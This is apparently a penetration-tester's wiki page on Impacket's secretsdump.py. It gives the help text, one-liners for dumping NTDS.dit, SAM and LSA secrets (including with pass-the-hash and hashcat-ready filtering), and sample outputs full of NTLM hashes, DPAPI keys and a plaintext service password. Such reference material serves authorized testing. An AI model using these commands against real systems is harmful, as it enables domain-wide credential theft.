---
title : "secretsdump.py"
# pre : ' '
description : "Performs various techniques to dump secrets from the remote machine without executing any agent there."
date : 2022-02-14T11:56:46+01:00
# hidden : true
# draft : true
weight : 100
# tags : ['']
---

---

Performs various techniques to dump secrets from the remote machine without executing any agent there.

## Installation

Install [Impacket]({{< ref "../impacket" >}}).

## Usage

```plain
secretsdump.py [-h] [-ts] [-debug] [-system SYSTEM] [-bootkey BOOTKEY] [-security SECURITY] [-sam SAM] [-ntds NTDS] [-resumefile RESUMEFILE] [-skip-sam] [-skip-security] [-outputfile OUTPUTFILE] [-use-vss]
                      [-rodcNo RODCNO] [-rodcKey RODCKEY] [-use-keylist] [-exec-method [{smbexec,wmiexec,mmcexec}]] [-use-remoteSSMethod] [-remoteSS-remote-volume REMOTESS_REMOTE_VOLUME]
                      [-remoteSS-local-path REMOTESS_LOCAL_PATH] [-just-dc-user USERNAME] [-ldapfilter LDAPFILTER] [-just-dc] [-just-dc-ntlm] [-skip-user SKIP_USER] [-pwd-last-set] [-user-status] [-history]
                      [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address] [-target-ip ip address]
                      target
```

## Flags

```plain
Impacket v0.13.0.dev0+20250820.203717.835623ae - Copyright Fortra, LLC and its affiliated companies 

Performs various techniques to dump secrets from the remote machine without executing any agent there.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address> or LOCAL (if you want to parse local files)

optional arguments:
  -h, --help            show this help message and exit
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -system SYSTEM        SYSTEM hive to parse
  -bootkey BOOTKEY      bootkey for SYSTEM hive
  -security SECURITY    SECURITY hive to parse
  -sam SAM              SAM hive to parse
  -ntds NTDS            NTDS.DIT file to parse
  -resumefile RESUMEFILE
                        resume file name to resume NTDS.DIT session dump (only available to DRSUAPI approach). This file will also be used to keep updating the session's state
  -skip-sam             Do NOT parse the SAM hive on remote system
  -skip-security        Do NOT parse the SECURITY hive on remote system
  -outputfile OUTPUTFILE
                        base output filename. Extensions will be added for sam, secrets, cached and ntds
  -use-vss              Use the NTDSUTIL VSS method instead of default DRSUAPI
  -rodcNo RODCNO        Number of the RODC krbtgt account (only avaiable for Kerb-Key-List approach)
  -rodcKey RODCKEY      AES key of the Read Only Domain Controller (only avaiable for Kerb-Key-List approach)
  -use-keylist          Use the Kerb-Key-List method instead of default DRSUAPI
  -exec-method [{smbexec,wmiexec,mmcexec}]
                        Remote exec method to use at target (only when using -use-vss). Default: smbexec
  -use-remoteSSMethod   Remotely create Shadow Snapshot via WMI and download SAM, SYSTEM and SECURITY from it, the parse locally
  -remoteSS-remote-volume REMOTESS_REMOTE_VOLUME
                        Remote Volume to perform the Shadow Snapshot and download SAM, SYSTEM and SECURITY
  -remoteSS-local-path REMOTESS_LOCAL_PATH
                        Path where download SAM, SYSTEM and SECURITY from Shadow Snapshot. It defaults to current path

display options:
  -just-dc-user USERNAME
                        Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. Implies also -just-dc switch
  -ldapfilter LDAPFILTER
                        Extract only NTDS.DIT data for specific users based on an LDAP filter. Only available for DRSUAPI approach. Implies also -just-dc switch
  -just-dc              Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)
  -just-dc-ntlm         Extract only NTDS.DIT data (NTLM hashes only)
  -skip-user SKIP_USER  Do NOT extract NTDS.DIT data for the user specified. Can provide comma-separated list of users to skip, or text file with one user per line
  -pwd-last-set         Shows pwdLastSet attribute for each NTDS.DIT account. Doesn't apply to -outputfile data
  -user-status          Display whether or not the user is disabled
  -history              Dump password history, and LSA secrets OldVal

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -keytab KEYTAB        Read keys for SPN from keytab file

connection:
  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
```

## Handy one-liners

For local authentication, add the `--local-auth` flag to the command.

### Dump NTDS

### Remote NTDS

```plain
secretsdump.py <domain>/<domain-or-local-admin>:<password>@<computer-or-domain-controller-ip>
```

### Local NTDS

Also check [NTDS.dit Dump&Extract]({{< ref "ntds-dump" >}}).

Required files:

- NTDS.dit (`C:\Windows\NTDS\ntds.dit`)
- SYSTEM (`C:\Windows\System32\config\SYSTEM`)

```plain
secretsdump.py -system SYSTEM -ntds NTDS.dit -hashes lmhash:nthash LOCAL -outputfile ntlm-extract -just-dc-ntlm -user-status -history
```

### Dump SAM (local)

Instead of using [samdump2]({{< ref "samdump2" >}}).

Required files:

- SAM (`C:\Windows\System32\config\SAM`)
- SYSTEM (`C:\Windows\System32\config\SYSTEM`)

```plain
secretsdump.py -sam SAM -system SYSTEM LOCAL        
```

### Dump specific user

```plain
secretsdump.py <domain>/<domain-or-local-admin>:<password>@<domain-controller-ip> -just-dc-user [USERNAME]
```

### Dump all hashes (hashcat ready)

```plain
secretsdump.py <domain>/<domain-or-local-admin>:<password>@<domain-controller-ip> -just-dc-ntlm
```

### Dump all hashes including history

```plain
secretsdump.py <domain>/<domain-or-local-admin>:<password>@<domain-controller-ip> -just-dc-ntlm -history
```

### Dump all hashes including history and user status

```plain
secretsdump.py <domain>/<domain-or-local-admin>:<password>@<domain-controller-ip> -just-dc-ntlm -history -user-status
```

### Filter enabled accounts hashcat ready

```plain
grep -E 'status=Enabled' secretsdump-users-with-status.txt | awk '{print $1}'
```

### Practical examples

{{%resources fa_icon_class="far fa-file-video" pattern="secretsdump.mp4"/%}}

### Dumping NTDS

Local Administrator privileges required, can be used against every system you're local administrator at.

```plain
$ secretsdump.py JohnDo_LA:'Welkom123'@10.10.10.10                                                                                                     
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x20eb60c12345678909b2e656af
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
serverlocaladmins:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[...]
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x3e54c484e6abd41234263bc70b11d540f1d0
dpapi_userkey:0x10ab5aed123456789c3870d64008f56836183e
[*] NL$KM 
NL$KM:a9288fd4f741d6d4af0c45b0831234567890b13c68f556c62f4e2cec28c4c14d222e546e0cc5664be6fa135ba90e6293512106ae2
[*] _SC_88MMB_VRT_DHF_HOMX 
SA_LOCAL_SERVICE@INFOSEC.NL.local:ThisIsAStrongPassword?
[*] Cleaning up... 
```

The file below is a example of the full output of the command above.

{{%resources title="Secretsdump example output" fa_icon_class="far fa-file" pattern=".*(txt)"/%}}

### Example dump all hashes NTLM format

```plain
secretsdump.py offsec.nl/administrator:Welkom1234@10.10.10.16 -just-dc-ntlm

Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:102277341d6c113a28017200e1dfafe9:::
offsec.nl\johndo:1107:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
offsec.nl\adm_johndo:1108:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
offsec.nl\janedo:1110:aad3b435b51404eeaad3b435b51404ee:f3fe13546c4c0d2db443a0865626203b:::
[...]
[*] Cleaning up...
```

### Dump with hash instead of plaintext password

```plain
$ secretsdump.py offsec.nl/sa.sql@10.10.10.10 -hashes ':55e2eb2ba1c8710ba2530929e3fe5e2f' -just-dc-ntlm
Impacket v0.9.22.dev1+20200924.183326.65cf657f - Copyright 2020 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ca919b8610623b7283bc9d0fb4c03713:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:53dca7b06adf7704769edcf8b59985a5:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
offsec.nl\sa.das-forefront:1114:aad3b435b51404eeaad3b435b51404ee:167ee7a267199ffa715cf8fd86738c93:::
offsec.nl\user1:1118:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
offsec.nl\user2:1119:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
offsec.nl\user3:1120:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
```

### Dump specific user only

```plain
$ secretsdump.py offsec.nl/johndo-adm@10.10.10.10 -just-dc-ntlm -just-dc-user john.do
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
offsec.nl\john.do:8124:aad3b435b51404eeaad3b435b51404ee:61ce05b7b3951672d5d42c4c16ccce6b:::
[*] Cleaning up... 
```

### Extract SAM accounts from SAM/SYSTEM hive

Instead of using [samdump2]({{< ref "samdump2" >}}).

Required files:

- SAM (`C:\Windows\System32\config\SAM`)
- SYSTEM (`C:\Windows\System32\config\SYSTEM`)

```plain
$ secretsdump.py -sam SAM -system SYSTEM LOCAL          
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0xabb459ddd821f4e0305b373605bce20e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8155d421e8780df8e232009a74bef7b7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6b0249e23821f46803d6ba5ace77490a:::
TESTING:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
John Do:1002:aad3b435b51404eeaad3b435b51404ee:88056d8301a3b9165f6b9efc671caa41:::
Henk:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```

### Example files SAM/SYSTEM

Example `SAM` and `SYSTEM` files zipped below.

{{%resources fa_icon_class="far fa-file" pattern=".*(SAM-SYSTEM)"/%}}

### Extract accounts from NTDS.dit

Also check [NTDS.dit Dump&Extract]({{< ref "ntds-dump" >}}).

Required files:

- NTDS.dit (`C:\Windows\NTDS\ntds.dit`)
- SYSTEM (`C:\Windows\System32\config\SYSTEM`)

```plain
$ secretsdump.py -system SYSTEM -ntds NTDS.dit -hashes lmhash:nthash LOCAL -outputfile ntlm-extract -just-dc-ntlm -user-status -history
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0xa78f11b1234567893f2b6ea8613764
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 640afd6c9912345678977329f09
[*] Reading and decrypting hashes from ntds.dit
john_do:19530:aad3b435b51404eeaad3b435b51404ee:6ed6a61234567898f78076f844::: (status=Enabled)
john_do_adm:19530:aad3b435b51404eeaad3b435b51404ee:2b311d396123456789f280077beee::: (status=Disabled)
```

### Example files NTDS.dit/SYSTEM

Example `NTDS.dit` and `SYSTEM` files zipped below.

{{%resources fa_icon_class="far fa-file" pattern=".*(NTDS.DIT-SYSTEM)"/%}}

## URL List

- [Github.com - secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
